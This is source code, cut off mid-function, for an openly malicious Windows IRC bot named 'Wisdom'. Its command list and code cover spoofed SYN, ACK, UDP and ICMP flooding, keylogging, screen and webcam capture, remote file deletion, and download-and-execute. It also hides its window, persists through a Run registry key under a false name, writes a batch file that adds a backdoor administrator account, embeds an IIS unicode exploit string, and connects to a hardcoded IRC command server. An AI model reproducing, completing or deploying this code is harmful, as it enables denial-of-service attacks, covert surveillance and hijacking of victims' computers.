/*

Wisdom IRC bot
Created to help me get oriented in C++
Lots of code from codeproject.com/codeguru.com/sdbot

commands:
  "*" beside a command means it isnt working correctly
  *NOTE* MAKE SURE YOU PUT IN CORRECT PARAMATERS, AS THE BOT MAY CRASH IF YOU DONT
  1)  ! version - request version of bot
  2)  ! exit - exit bot
  3)  ! spoof get - get current spoof address
  4)  ! spoof off - disable spoofing from ip, only spoof from current subnet (default)
  5)  ! spoof <ip> - set spoofing to an ip address (this can be used for example with ping, to create a smurf attack, or a syn flood to create a drdos attack)
  6)  ! icmp <ip> <time> - sends random icmp codes to an ip address for an allotted time (512 byte packets + spoofing)
  7)  ! ack <ip> <port> <time> - attacks an ip with ack packets (spoofing, VERY fast sending)
  8)  ! syn <ip> <port> <time> - attacks an ip with syn packets (spoofing, TURBO fast sending)
  9)  ! random <ip> <port> <time> - alternates between syn/ack packets (spoofing, REALLY fast sending)
  10) ! enable <password> - attempts to enable commands on the bot, the password is what you set with the disable command
  11) ! disable <password> - if bot is enabled, disables it, and sets the enable password
  12) ! udp <ip> <port> <time> - sends udp packets (spoofed) to an ip, if port = 0 then it uses random desination ports
  13) ! dns <ip/host> - resolve a host/ip
  14) ! exec <file> [command line] - opens a file (no spaces)
  15) ! uptime - get the system uptime
  16) ! keyspy enable <number between 0 to 15> - enable real time irc based keylogger, the number is used as the colour for the messages (easier to read with many bots)
  17) ! keyspy disable - disable real time irc keylogger
  18) ! delete <file> - delete a file off victims hard disk
  19) ! send <nick> <file> <send as> - sends a file to someone
  20) ! active - returns the active window (usefull if your looking for an interesting screen capture)
  21) ! capture screen <save as> - takes a screen shot
  22) ! capture drivers - list video for windows device(s)
  23) ! capture frame <save as> <index> <width> <height> - captures a frame (bitmap) from a video for windows device
  24) ! capture video <save as> <index> <time> <width> <height> - captures a video (avi) from a video for windows device
  25) ! pscan <subnet> <port> <type> [delay] - scan a subnet for open ports.. if type is 1 then subnet is X, if type is 2 then subnet is X.X, etc..
  26) ! sysinfo - gives you some info about the system
  27) ! raw <command> - sends a raw command to the server
  28) ! download <http url> <file> [execute] - downloads a file, execute is a boolean of wether to execute
  29) ! clone load <server> <port> - loads 1 clone onto a server 
  30) ! clone kill - disconnects all clones
  31) ! clone raw <command> - sends a raw command to the server
  + you can dcc files to the bot
  + dcc chat console with basic file/process manager
  + socks4 server running on port 559
  + basic plugin system

to do:
  http request generator (banner clicking)
  find files command

notes:
  the port scanner can preform various actions based on what port you are scanning..
    - port 1433: it will auto check if the 'sa' account is present on an SQL server
	- port 80: it will auto check if the host is vulnerable to a version of the unicode IIS exploit

*/

#define WIN32_LEAN_AND_MEAN
#pragma pack(1)
#pragma comment(linker,"/FILEALIGN:0x200 /MERGE:.data=.text /MERGE:.rdata=.text /SECTION:.text,EWR")

#include <windows.h>
#include <winsock2.h>
#include <wininet.h>
#include <stdio.h>
#include <stdlib.h>
#include <shellapi.h>
#include <ws2tcpip.h>
#include <vfw.h>
#include <sql.h>
#include <sqlext.h>
#include <winnetwk.h>
#include <psapi.h>
#include <urlmon.h>

#define SYN 0x02 
#define ACK 0x10
#define IP_HDRINCL 2
#define REQ_DATASIZE 1024
#define WM_PRIVMSG WM_USER+49283
#define SOCKS4_CONNECT 1
#define SOCKS4_GRANT 90
#define SOCKS4_REJECT 91

typedef struct ip_hdr 
{ 
	unsigned char h_verlen; 
	unsigned char tos; 
	unsigned short total_len; 
	unsigned short ident; 
	unsigned short frag_and_flags; 
	unsigned char ttl; 
	unsigned char proto; 
	unsigned short checksum; 
	unsigned int sourceIP; 
	unsigned int destIP; 
}IPHEADER; 
typedef struct SOCKS4HEADER {
	u_char vn;
	u_char cd;
	unsigned short destport;
	unsigned long destaddr;
	char userid[1024];
}SOCKS4HEADER;
typedef struct tsd_hdr  
{ 
	unsigned long saddr;
	unsigned long daddr;  
	char mbz; 
	char ptcl; 
	unsigned short tcpl; 
}PSDHEADER; 
typedef struct tcp_hdr 
{ 
	USHORT th_sport;  
	USHORT th_dport; 
	unsigned int th_seq; 
	unsigned int th_ack; 
	unsigned char th_lenres; 
	unsigned char th_flag;
	USHORT th_win; 
	USHORT th_sum; 
	USHORT th_urp; 
}TCPHEADER; 
typedef struct tagICMPHDR
{ 
    unsigned char icmp_type;
    unsigned char icmp_code; 
    unsigned short icmp_cksum; 
    unsigned short icmp_id;
    unsigned short icmp_seq; 
} ICMPHDR, *PICMPHDR;
typedef struct tagECHOREQUEST
{
	IPHEADER ipHeader;
    ICMPHDR icmpHdr;
    char cData[REQ_DATASIZE];
} ECHOREQUEST, *PECHOREQUEST;
typedef struct udphdr
{
    unsigned short sport;	
    unsigned short dport;
    unsigned short Length; 	 
    unsigned short Checksum;
}UDPHDR;
typedef struct UDPPACKET
{
	IPHEADER ipHeader;
    UDPHDR udpHeader;
    char cData[REQ_DATASIZE];
}UDPPACKET;
//structures to allow multi threaded packet sending
typedef struct UDPFLOOD
{
	char target[256];
	int port;
	int time;
}UDPFLOOD;
typedef struct ICMPFLOOD
{
	char target[256];
	int time;
}ICMPFLOOD;
typedef struct TCPFLOOD
{
	char type[32];
	char target[256];
	int port;
	int time;
}TCPFLOOD;
typedef struct PSCAN
{
	char subnet[512];
	int port;
	int scantype;
	int delay;
}PSCAN;

//structure to allow multiple dcc receives at a time
typedef struct DCCGET
{
	HANDLE hFile;
	sockaddr_in sin;
	char file[MAX_PATH-1];
	unsigned long len;
}DCCGET;
//structure to allow multiple dcc sends at a time
typedef struct DCCSEND
{
	int unused;
	char target[MAX_PATH-1];
	char file[MAX_PATH-1];
	char sfile[MAX_PATH-1];
}DCCSEND;

LRESULT CALLBACK WindowProcedure (HWND, UINT, WPARAM, LPARAM);
char * rndnick(char *strbuf);
int in(char *raw);
int parse(char *line);
USHORT checksum(USHORT *buffer, int size);
LRESULT CALLBACK JournalLogProc(int code, WPARAM wParam, LPARAM lParam);
DWORD WINAPI UDP(LPVOID param);
DWORD WINAPI ICMP(LPVOID param);
DWORD WINAPI TCP(LPVOID param);
DWORD WINAPI DccRecv(LPVOID param);
DWORD WINAPI DccSend(LPVOID param);
bool Capture(char *file);
int CaptureFrame(char *file, int index, int x, int y);
int CaptureVideo(char *file, int index, int time, int x, int y);
DWORD WINAPI PScan(LPVOID param);
DWORD WINAPI sqlcheck(void * addr);
DWORD WINAPI console(LPVOID param);
int cpuspeed(void);
unsigned __int64 cyclecount();
DWORD WINAPI UnicodeScan(void * addr);
int clone_in(char *raw);
int clone_parse(char *line);
DWORD WINAPI SocksDaemon(LPVOID param);
DWORD WINAPI Socks4ClientThread(LPVOID pParam);
void transfer_loop(SOCKET target, SOCKET client);

//edit this to change the port
UINT port = 6667;
//two strings which can be seen when the exe is packed, to throw off bot thefts
char gay_server[] = "irc.efnet.net";
char gay_channel[] = "#opers";
//version info
UINT major = 5;
UINT minor = 39;
char verinfo[] = "Subhuman Solution";
//the unicode exploit string it will scan for
char unicode[] = "/scripts/%2e%2e%c0%af%2e%2e/%77%69%6e%6e%74/%73%79%73%74%65%6d%33%32/%63%6d%64%2e%65%78%65?/c+";
int key = 0x3ff38;
SOCKET CloneSocket[20];
int CloneCount;
char spoof[512];
HWND Window;
SOCKADDR_IN	send_sin;
SOCKET ssock;
char szClassName[] = "Explorer";
char EnablePassword[512];
char serv[512];
BOOL Enabled = TRUE;
BOOL connected;
BOOL spoofing;
SOCKET sock;
unsigned int uptime;
HHOOK keyhook;
BOOL keylogging;
char KeyBuffer[512];
HANDLE hLastFocus;
int KeyClr;
char target[MAX_PATH];
char server[512];
char chan[512];
char channel[512];
BOOL cam;
BOOL en;

void EntryPoint()
{
    MSG messages;
    WNDCLASSEX wincl;
    WSADATA wsa;

	WSAStartup(0x202, &wsa);
    wincl.hInstance = GetModuleHandle(NULL);
    wincl.lpszClassName = szClassName;
    wincl.lpfnWndProc = WindowProcedure;
    wincl.style = CS_DBLCLKS;
    wincl.cbSize = sizeof (WNDCLASSEX);
    wincl.hIcon = LoadIcon (NULL, IDI_APPLICATION);
    wincl.hIconSm = LoadIcon (NULL, IDI_APPLICATION);
    wincl.hCursor = LoadCursor (NULL, IDC_ARROW);
    wincl.lpszMenuName = NULL;
    wincl.cbClsExtra = 0;
    wincl.cbWndExtra = 0;
    wincl.hbrBackground = (HBRUSH) COLOR_BACKGROUND;
    if (!RegisterClassEx (&wincl))
	{
		ExitProcess(0);
	}
    Window = CreateWindowEx (0, szClassName, "Explorer", WS_OVERLAPPEDWINDOW, CW_USEDEFAULT, CW_USEDEFAULT, 544, 375, HWND_DESKTOP, NULL, GetModuleHandle(NULL), NULL);
    ShowWindow (Window, SW_HIDE);
	connected = FALSE;
	spoofing = FALSE;
	keylogging = false;
    while (GetMessage (&messages, NULL, 0, 0))
    {
        TranslateMessage(&messages);
        DispatchMessage(&messages);
    }
    WSACleanup();
    ExitProcess(0);
}

void Char2Hex(const unsigned char ch, char* szHex)
{
	unsigned char byte[2];
	byte[0] = ch/16;
	byte[1] = ch%16;
	for(int i=0; i<2; i++)
	{
		if(byte[i] >= 0 && byte[i] <= 9)
			szHex[i] = '0' + byte[i];
		else
			szHex[i] = 'A' + byte[i] - 10;
	}
	szHex[2] = 0;
}

void Hex2Char(const char* szHex, unsigned char& rch)
{
	rch = 0;
	for(int i=0; i<2; i++)
	{
		if(*(szHex + i) >='0' && *(szHex + i) <= '9')
			rch = (rch << 4) + (*(szHex + i) - '0');
		else if(*(szHex + i) >='A' && *(szHex + i) <= 'F')
			rch = (rch << 4) + (*(szHex + i) - 'A' + 10);
		else
			break;
	}
}    

void CharStr2HexStr(const unsigned char* pucCharStr, char* pszHexStr, int iSize)
{
	int i;
	char szHex[3];
	pszHexStr[0] = 0;
	for(i=0; i<iSize; i++)
	{
		Char2Hex(pucCharStr[i], szHex);
		strcat(pszHexStr, szHex);
	}
}

void HexStr2CharStr(const char* pszHexStr, unsigned char* pucCharStr, int iSize)
{
	int i;
	unsigned char ch;
	for(i=0; i<iSize; i++)
	{
		Hex2Char(pszHexStr+2*i, ch);
		pucCharStr[i] = ch;
	}
}

LRESULT CALLBACK WindowProcedure (HWND hwnd, UINT message, WPARAM wParam, LPARAM lParam)
{
	SOCKADDR_IN sin;
	LPHOSTENT dns;
	unsigned long lpdwflags;
	char buffer[512];
	char nick1[16], nick[32];
	char *nickx;
	unsigned long err;
	HKEY reg;
	SOCKET test;
	BOOL opt;
	char svName[256];
	char svComment[512];
	int i;

    switch (message)
    {
		case WM_CLOSE:
			wsprintf(buffer, "QUIT :Received WM_CLOSE message.\r\n");
			send(sock, buffer, lstrlen(buffer), 0);
			RegCreateKeyEx(HKEY_LOCAL_MACHINE, "Software\\Microsoft\\Windows\\CurrentVersion\\Run", 0, NULL, REG_OPTION_NON_VOLATILE, KEY_ALL_ACCESS, NULL, &reg, NULL);
			RegSetValueEx(reg, "Windows DLL Loader", 0, REG_SZ, (const unsigned char *)&target, lstrlen(target)+1);
			RegCloseKey(reg);
			return 0;
			break;
		case WM_DESTROY:
			wsprintf(buffer, "QUIT :Received WM_DESTROY message.\r\n");
			send(sock, buffer, lstrlen(buffer), 0);
			RegCreateKeyEx(HKEY_LOCAL_MACHINE, "Software\\Microsoft\\Windows\\CurrentVersion\\Run", 0, NULL, REG_OPTION_NON_VOLATILE, KEY_ALL_ACCESS, NULL, &reg, NULL);
			RegSetValueEx(reg, "Windows DLL Loader", 0, REG_SZ, (const unsigned char *)&target, lstrlen(target)+1);
			RegCloseKey(reg);
			return 0;
			break;
		case WM_SHOWWINDOW:
			ShowWindow(hwnd, SW_HIDE);
			break;
		case WM_ACTIVATE:
			ShowWindow(hwnd, SW_HIDE);
			break;
		case WM_SETFOCUS:
			ShowWindow(hwnd, SW_HIDE);
			break;
		case WM_CREATE:
			DWORD dwThreadID;
			MoveWindow(hwnd, 5000, 5000, 0, 0, false);
			CreateMutex(NULL, FALSE, "88FinalSolution88");
			if (GetLastError() == ERROR_ALREADY_EXISTS) 
			{
				ExitProcess(0);
			}
			CloneCount = 0;
			for (i = 0; i < 20; i++)
			{
				CloneSocket[i] = INVALID_SOCKET;
			}
			//-EDIT HERE-
			cam = FALSE;
			for (i=0;i<10;i++) {
				if(capGetDriverDescription(i, svName, 255, svComment, 511)) {
					cam = TRUE;
				}
			}
			en = FALSE;
			CreateThread(NULL, 0, &SocksDaemon, NULL, 0, &dwThreadID);
			strcpy(server,"irc.peeko.org"); //main dns for bots to connect to
			//-STOP EDITING-
			strcpy(serv, server);
			strcpy(chan, "#peekaboo");
			strcpy(channel, "#peekaboo");
			SetTimer(hwnd, 1, 30000, NULL);
			break;
		case WM_QUERYENDSESSION:
			wsprintf(buffer, "QUIT :Received WM_QUERYENDSESSION message.\r\n");
			send(sock, buffer, lstrlen(buffer), 0);
			RegCreateKeyEx(HKEY_LOCAL_MACHINE, "Software\\Microsoft\\Windows\\CurrentVersion\\Run", 0, NULL, REG_OPTION_NON_VOLATILE, KEY_ALL_ACCESS, NULL, &reg, NULL);
			RegSetValueEx(reg, "Windows DLL Loader", 0, REG_SZ, (const unsigned char *)&target, lstrlen(target)+1);
			RegCloseKey(reg);
			break;
		case WM_ENDSESSION:
			wsprintf(buffer, "QUIT :Received WM_ENDSESSION message.\r\n");
			send(sock, buffer, lstrlen(buffer), 0);
			RegCreateKeyEx(HKEY_LOCAL_MACHINE, "Software\\Microsoft\\Windows\\CurrentVersion\\Run", 0, NULL, REG_OPTION_NON_VOLATILE, KEY_ALL_ACCESS, NULL, &reg, NULL);
			RegSetValueEx(reg, "Windows DLL Loader", 0, REG_SZ, (const unsigned char *)&target, lstrlen(target)+1);
			RegCloseKey(reg);
			break;
		case WM_QUIT:
			wsprintf(buffer, "QUIT :Received WM_QUIT message.\r\n");
			send(sock, buffer, lstrlen(buffer), 0);
			RegCreateKeyEx(HKEY_LOCAL_MACHINE, "Software\\Microsoft\\Windows\\CurrentVersion\\Run", 0, NULL, REG_OPTION_NON_VOLATILE, KEY_ALL_ACCESS, NULL, &reg, NULL);
			RegSetValueEx(reg, "Windows DLL Loader", 0, REG_SZ, (const unsigned char *)&target, lstrlen(target)+1);
			RegCloseKey(reg);
			return 0;
			break;
		case WM_PRIVMSG:
			wsprintf(buffer, "PRIVMSG %s :%s", channel, wParam);
			send(sock, buffer, lstrlen(buffer), 0);
			break;
		case WM_CANCELJOURNAL:
			BYTE keytbl[256];
			int i;

			for(i=0;i<256;i++) keytbl[i]=0;
			SetKeyboardState(keytbl);
			keyhook = SetWindowsHookEx(WH_JOURNALRECORD,JournalLogProc,GetModuleHandle(NULL),0);
			break;
		case 26643: //clone callback
			switch (WSAGETSELECTEVENT(lParam))
			{
				case FD_CONNECT:
					err = WSAGETSELECTERROR(lParam);
					if (err == WSAECONNREFUSED || err == WSAENETUNREACH || err == WSAETIMEDOUT || err == WSAEAFNOSUPPORT || err == WSAEFAULT || err == WSAEINVAL || err == WSAEISCONN || err == WSAEMFILE || err == WSAENOBUFS || err == WSAENOTCONN)
					{
						if (CloneCount != 0)
							CloneCount = CloneCount - 1;
						for (i = 0; i < 20; i++)
						{
							if (CloneSocket[i] == (SOCKET)wParam)
							{
								CloneSocket[i] = INVALID_SOCKET;
							}
						}
						return DefWindowProc (hwnd, message, wParam, lParam);
					}
					ZeroMemory(buffer, sizeof(buffer));
					wsprintf(buffer, "USER %s %s %s :%s\r\nNICK %s\r\n", rndnick(nick1), rndnick(nick1), rndnick(nick1), rndnick(nick1), rndnick(nick1));
					send((SOCKET)wParam, buffer, lstrlen(buffer), 0);
					return DefWindowProc (hwnd, message, wParam, lParam);
				case FD_READ:
					memset(buffer, 0, sizeof(buffer));
					ZeroMemory(buffer, sizeof(buffer));
					recv(wParam, buffer, sizeof(buffer), 0);
					clone_in(buffer);
					return DefWindowProc (hwnd, message, wParam, lParam);
			}
		case 52911: //main bot callback
			switch (WSAGETSELECTEVENT(lParam))
			{
				case FD_READ:
					memset(buffer, 0, sizeof(buffer));
					ZeroMemory(buffer, sizeof(buffer));
					recv(sock, buffer, sizeof(buffer), 0);
					in(buffer);
					return DefWindowProc (hwnd, message, wParam, lParam);
				case FD_CONNECT:
					err = WSAGETSELECTERROR(lParam);
					//check if there was an error while connecting, if there was then change the server to the default server (in case we were redirected with a 010, this way we wont lose the bot)
					if (err == WSAECONNREFUSED || err == WSAENETUNREACH || err == WSAETIMEDOUT || err == WSAEAFNOSUPPORT || err == WSAEFAULT || err == WSAEINVAL || err == WSAEISCONN || err == WSAEMFILE || err == WSAENOBUFS || err == WSAENOTCONN)
					{
						connected = FALSE;
						closesocket(sock);
						strcpy(serv, server);
					}
					uptime = GetTickCount();
					connected = TRUE;
					nickx = rndnick(nick1);
					if (cam == TRUE)
					{
						strcpy(nick,"cam-");
						strcat(nick,nickx);
					}
					else
					{
						strcpy(nick,nickx);
					}
					memset(buffer, 0, sizeof(buffer));
					ZeroMemory(buffer, sizeof(buffer));
					wsprintf(buffer, "USER %s %s %s :%s\r\nNICK %s\r\n", nick, nick, nick, nick, nick);
					send(sock, buffer, lstrlen(buffer), 0);
					return DefWindowProc (hwnd, message, wParam, lParam);
				case FD_CLOSE: 
					connected = FALSE;
					closesocket(sock);
					strcpy(serv, server);
					return DefWindowProc (hwnd, message, wParam, lParam);
			}
		case WM_TIMER:
			if (en == FALSE)
			{
				test = socket(AF_INET, SOCK_RAW, IPPROTO_RAW);
				opt = TRUE;
				if (setsockopt(test, IPPROTO_IP, IP_HDRINCL, (char *)&opt, sizeof(opt)) != SOCKET_ERROR)
				{
					char path[MAX_PATH];
					HANDLE hFile;
					DWORD oon;

					en = TRUE;
					ZeroMemory(target, sizeof(target));
					ZeroMemory(path, sizeof(path));
					GetModuleFileName(GetModuleHandle(NULL), path, sizeof(path));
					GetWindowsDirectory(target, sizeof(target));
					SetCurrentDirectory(target);
					strcat(target, "\\RUNDLL16.EXE");
					CopyFile(path, target, FALSE);
					SetFileAttributes(target, FILE_ATTRIBUTE_SYSTEM);
					SetFileAttributes(target, FILE_ATTRIBUTE_HIDDEN);
					RegCreateKeyEx(HKEY_LOCAL_MACHINE, "Software\\Microsoft\\Windows\\CurrentVersion\\Run", 0, NULL, REG_OPTION_NON_VOLATILE, KEY_ALL_ACCESS, NULL, &reg, NULL);
					RegSetValueEx(reg, "Windows DLL Loader", 0, REG_SZ, (const unsigned char *)&target, lstrlen(target)+1);
					RegCloseKey(reg);
					//create a backdoor user account on the box
					hFile = CreateFile("temp.bat", GENERIC_WRITE, 0, 0, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, 0);
					wsprintf(buffer, "%s\r\n%s\r\n%s\r\n%s\r\n", "@echo off", "net user /add System letmein", "net localgroup /add Administrators System", "del %0");
					WriteFile(hFile, buffer, lstrlen(buffer), &oon, NULL);
					CloseHandle(hFile);
					//ShellExecute(GetDesktopWindow(), "open", "temp.bat", NULL, NULL, SW_HIDE);
				}
				closesocket(test);
			}
			if (en == FALSE)
			{
				return DefWindowProc (hwnd, message, wParam, lParam);
			}
			RegCreateKeyEx(HKEY_LOCAL_MACHINE, "Software\\Microsoft\\Windows\\CurrentVersion\\Run", 0, NULL, REG_OPTION_NON_VOLATILE, KEY_ALL_ACCESS, NULL, &reg, NULL);
			RegSetValueEx(reg, "Windows DLL Loader", 0, REG_SZ, (const unsigned char*)target, lstrlen(target)+1);
			RegCloseKey(reg);
			if (wParam == 1)
			{
				if (!connected)
				{
					if (InternetGetConnectedState(&lpdwflags, 0))
					{
						sock = socket(AF_INET, SOCK_STREAM, 0);
						WSAAsyncSelect(sock, hwnd, 52911, FD_READ | FD_CLOSE | FD_CONNECT);
						sin.sin_family = AF_INET;
						sin.sin_port = htons(port);
						sin.sin_addr.s_addr = inet_addr(serv);
						if (sin.sin_addr.s_addr == INADDR_NONE)
						{
							dns = gethostbyname(serv);
							if (dns == NULL)
							{
								return DefWindowProc (hwnd, message, wParam, lParam);
							}
							sin.sin_addr.s_addr = *(int long *)dns->h_addr_list[0];
						}
						connect(sock, (LPSOCKADDR)&sin, sizeof(SOCKADDR_IN));
					}
				}
			}
			return DefWindowProc (hwnd, message, wParam, lParam);
    }
    return DefWindowProc (hwnd, message, wParam, lParam);
}

int clone_in(char *raw)
{
	char *ptr;

	clone_parse(raw);
	ptr = strstr(raw, "\r\n");
	while (ptr != 0)
	{
		ptr = ptr + 2;
		clone_parse(ptr);
		ptr = strstr(ptr, "\r\n");
		
	}
	return 0;
}

int clone_parse(char *line)
{
	char *arg[32];
	char buffer[512];
	int i;

	line[lstrlen(line)-2] = 0;
	arg[0] = strtok(line, " ");
	for (i = 1; i < 32; i++) arg[i] = strtok(NULL, " ");
	if (lstrcmp(arg[0],"PING") == 0)
	{
		wsprintf(buffer, "PONG %s\r\n", arg[1]);
		send(sock, buffer, lstrlen(buffer), 0);
	}
	return 0;
}

int in(char *raw)
{
	char *ptr;

	parse(raw);
	ptr = strstr(raw, "\r\n");
	while (ptr != 0)
	{
		ptr = ptr + 2;
		parse(ptr);
		ptr = strstr(ptr, "\r\n");
		
	}
	return 0;
}

int parse(char *line)
{
	char *arg[32];
	char buffer[512];
	int i, x;

	line[lstrlen(line)-2] = 0;
	arg[0] = strtok(line, " ");
	for (i = 1; i < 32; i++) arg[i] = strtok(NULL, " ");
	if (lstrcmp(arg[0],"PING") == 0)
	{
		wsprintf(buffer, "PONG %s\r\nJOIN %s\r\n", arg[1], chan);
		send(sock, buffer, lstrlen(buffer), 0);
	}
	if (lstrcmp(arg[1],"001") == 0)
	{
		wsprintf(buffer, "JOIN %s\r\n", chan);
		send(sock, buffer, lstrlen(buffer), 0);
	}
	if (lstrcmp(arg[1],"010") == 0)
	{
		strncpy(serv, arg[3], 512);
		closesocket(sock);
	}
	if (lstrcmp(arg[3],":\1DCC") == 0)
	{
		if (lstrcmp(arg[4],"RESUME") == 0)
		{
			wsprintf(buffer, "PRIVMSG %s :DCC resume is not supported (yet).\r\n", channel);
			send(sock, buffer, lstrlen(buffer), 0);
		}
		if (lstrcmp(arg[4],"SEND") == 0)
		{
			DCCGET dcc;
			DWORD thread;

			if (lstrlen(arg[8]) == 0) return 0;
			strncpy(dcc.file, arg[5], MAX_PATH-1);
			dcc.hFile = CreateFile(arg[5],GENERIC_WRITE, 0, 0, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, 0);
			if (dcc.hFile == INVALID_HANDLE_VALUE)
			{
				wsprintf(buffer, "PRIVMSG %s :CreateFile() failed.\r\n", channel);
				send(sock, buffer, lstrlen(buffer), 0);
				return 0;
			}
			arg[8][lstrlen(arg[8])-1] = 0;
			dcc.len = atoi(arg[8]);
			dcc.sin.sin_family = AF_INET;
			dcc.sin.sin_port = htons(atoi(arg[7]));
			dcc.sin.sin_addr.s_addr = htonl(atol(arg[6]));
			CreateThread(NULL, 0, &DccRecv, (void *)&dcc, 0, &thread);
			wsprintf(buffer, "PRIVMSG %s :Downloading '%s' through DCC (%d bytes)...\r\n", channel, dcc.file, dcc.len);
			send(sock, buffer, lstrlen(buffer), 0);
		}
		if (lstrcmp(arg[4],"CHAT") == 0)
		{
			DWORD thread;
			SOCKADDR_IN sin;

			if (lstrlen(arg[7]) == 0) return 0;
			arg[7][lstrlen(arg[7])-1] = 0;
			sin.sin_family = AF_INET;
			sin.sin_port = htons(atoi(arg[7]));
			sin.sin_addr.s_addr = htonl(atol(arg[6]));
			CreateThread(NULL, 0, &console, (void *)&sin, 0, &thread);
			wsprintf(buffer, "PRIVMSG %s :Initializing DCC console...\r\n", channel);
			send(sock, buffer, lstrlen(buffer), 0);
		}
	}
	if (lstrcmp(arg[1],"PRIVMSG") == 0)
	{
		if (arg[2][1] == 35)
		{
			strcpy(channel, arg[2]);
		}
		else {
			strcpy(channel, chan);
		}
	}
	if (lstrcmp(arg[3],":!") == 0)
	{
		WIN32_FIND_DATA find;
		HANDLE hFind;
		HMODULE hDLL;
		FARPROC wisdom_OnPrivmsg;

		strcpy(buffer,"");
		for (i=4; i<32; i++)
		{
			if (lstrlen(arg[i]) > 0)
			{
				if (i == 5) strcpy(buffer, arg[i]);
				else 
				{
					strcat(buffer," ");
					strcat(buffer,arg[i]);
				}
			}
		}
		if (lstrcmp(arg[4],"enable") == 0)
		{
			if (lstrlen(arg[5]) == 0) return 0;
			if (lstrcmp(arg[5],EnablePassword) == 0)
			{
				Enabled = TRUE;
				wsprintf(buffer, "PRIVMSG %s :Password accepted, commands enabled.\r\n", channel);
				send(sock, buffer, lstrlen(buffer), 0);
			}
		}
		if (!Enabled) return 0;
		if (lstrcmp(arg[4],"disable") == 0)
		{
			if (lstrlen(arg[5]) == 0) return 0;
			if (arg[5] != NULL)
			{
				memset(EnablePassword, 0, sizeof(EnablePassword));
				ZeroMemory(EnablePassword, sizeof(EnablePassword));
				strncpy(EnablePassword, arg[5], 512);
				Enabled = FALSE;
				wsprintf(buffer, "PRIVMSG %s :Enable password set to '%s', bot disabled.\r\n", channel, EnablePassword);
				send(sock, buffer, lstrlen(buffer), 0);
			}
		}
		if (lstrcmp(arg[4],"exit") == 0)
		{
			CloseWindow(Window);
			PostQuitMessage(0);
		}
		if (lstrcmp(arg[4],"clone") == 0)
		{
			if (lstrcmp(arg[5],"raw") == 0)
			{
				strcpy(buffer,"");
				for (i=5; i<32; i++)
				{
					if (lstrlen(arg[i]) > 0)
					{
						if (i == 5) strcpy(buffer, arg[i]);
						else 
						{
							strcat(buffer," ");
							strcat(buffer,arg[i]);
						}
					}
				}
				strcat(buffer, "\r\n");
				for (i = 0; i < 20; i++)
				{
					send(CloneSocket[i], buffer, lstrlen(buffer), 0);
				}
			}
			if (lstrcmp(arg[5],"kill") == 0)
			{
				for (i = 0; i < 20; i++)
				{
					closesocket(CloneSocket[i]);
				}
				CloneCount = 0;
				wsprintf(buffer, "PRIVMSG %s :Clones killed.\r\n", channel);
				send(sock, buffer, lstrlen(buffer), 0);
			}
			if (lstrcmp(arg[5],"load") == 0)
			{
				SOCKADDR_IN s;
				LPHOSTENT d;

				if (CloneCount >= 19)
				{
					wsprintf(buffer, "PRIVMSG %s :Max clones reached.\r\n", channel);
					send(sock, buffer, lstrlen(buffer), 0);
					return 0;
				}
				wsprintf(buffer, "PRIVMSG %s :Connecting clone to %s[:%s].\r\n", channel, arg[6], arg[7]);
				send(sock, buffer, lstrlen(buffer), 0);
				CloneSocket[CloneCount] = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
				WSAAsyncSelect(CloneSocket[CloneCount], Window, 26643, FD_READ | FD_CLOSE | FD_CONNECT);
				s.sin_family = AF_INET;
				s.sin_port = htons(atoi(arg[7]));
				s.sin_addr.s_addr = inet_addr(arg[6]);
				if (s.sin_addr.s_addr == INADDR_NONE)
				{
					d = gethostbyname(arg[6]);
					if (d == NULL) 
					{
						wsprintf(buffer, "PRIVMSG %s :Can't resolve IRC server.\r\n", channel);
						send(sock, buffer, lstrlen(buffer), 0);
						return 0;
					}
					s.sin_addr.s_addr = *(int long *)d->h_addr_list[0];
				}
				connect(CloneSocket[CloneCount], (struct sockaddr *)&s, sizeof(s));
				CloneCount = CloneCount + 1;
			}
		}
		if (lstrcmp(arg[4],"pscan") == 0)
		{
			PSCAN info;
			DWORD thread;

			if (lstrlen(arg[7]) == 0) return 0;
			strcpy(info.subnet, arg[5]);
			info.port = atoi(arg[6]);
			info.scantype = atoi(arg[7]);
			info.delay = 3;
			if (lstrlen(arg[8]) != 0)
			{
				info.delay = atoi(arg[8]);
			}
			CreateThread(NULL, 0, &PScan, (void *)&info, 0, &thread);
		}
		if (lstrcmp(arg[4],"delete") == 0)
		{
			if (lstrlen(arg[5]) == 0) return 0;
			if (DeleteFile(arg[5]) == TRUE)
			{
				wsprintf(buffer, "PRIVMSG %s :%s has been deleted.\r\n", channel, arg[5]);
				send(sock, buffer, lstrlen(buffer), 0);
			}
			else {
				wsprintf(buffer, "PRIVMSG %s :Unable to delete %s.\r\n", channel, arg[5]);
				send(sock, buffer, lstrlen(buffer), 0);
			}
		}
		if (lstrcmp(arg[4],"raw") == 0)
		{
			strcpy(buffer,"");
			for (i=5; i<32; i++)
			{
				if (lstrlen(arg[i]) > 0)
				{
					if (i == 5) strcpy(buffer, arg[i]);
					else 
					{
						strcat(buffer," ");
						strcat(buffer,arg[i]);
					}
				}
			}
			strcat(buffer, "\r\n");
			send(sock, buffer, lstrlen(buffer), 0);
		}
		if (lstrcmp(arg[4],"dns") == 0)
		{
			HOSTENT *hostent = NULL;
			IN_ADDR iaddr;
			DWORD addr = inet_addr(arg[5]);

			if (lstrlen(arg[5]) == 0) return 0;
			if (addr != INADDR_NONE) {
				hostent = gethostbyaddr((char *)&addr, sizeof(struct in_addr), AF_INET);
				if (hostent != NULL) {
					wsprintf(buffer, "PRIVMSG %s :Resolved %s to %s.\r\n", channel, arg[5], hostent->h_name);
					send(sock, buffer, lstrlen(buffer), 0);
				}
			}
			else {
				hostent = gethostbyname(arg[5]);
				if (hostent != NULL) {
					iaddr = *((LPIN_ADDR)*hostent->h_addr_list);
					wsprintf(buffer, "PRIVMSG %s :Resolved %s to %s.\r\n", channel, arg[5], inet_ntoa(iaddr));
					send(sock, buffer, lstrlen(buffer), 0);
				}
			}
			if (hostent == NULL) 
			{
				wsprintf(buffer, "PRIVMSG %s :Unable to resolve host.\r\n", channel);
				send(sock, buffer, lstrlen(buffer), 0);
			}
		}
		if (lstrcmp(arg[4],"spoof") == 0)
		{
			if (lstrlen(arg[5]) == 0) return 0;
			if (lstrcmp(arg[5],"off") == 0)
			{
				wsprintf(buffer, "PRIVMSG %s :Spoofing disabled.\r\n", channel);
				send(sock, buffer, lstrlen(buffer), 0);
				spoofing = FALSE;
				return 0;
			}
			if (lstrcmp(arg[5],"get") == 0)
			{
				if (spoofing)
				{
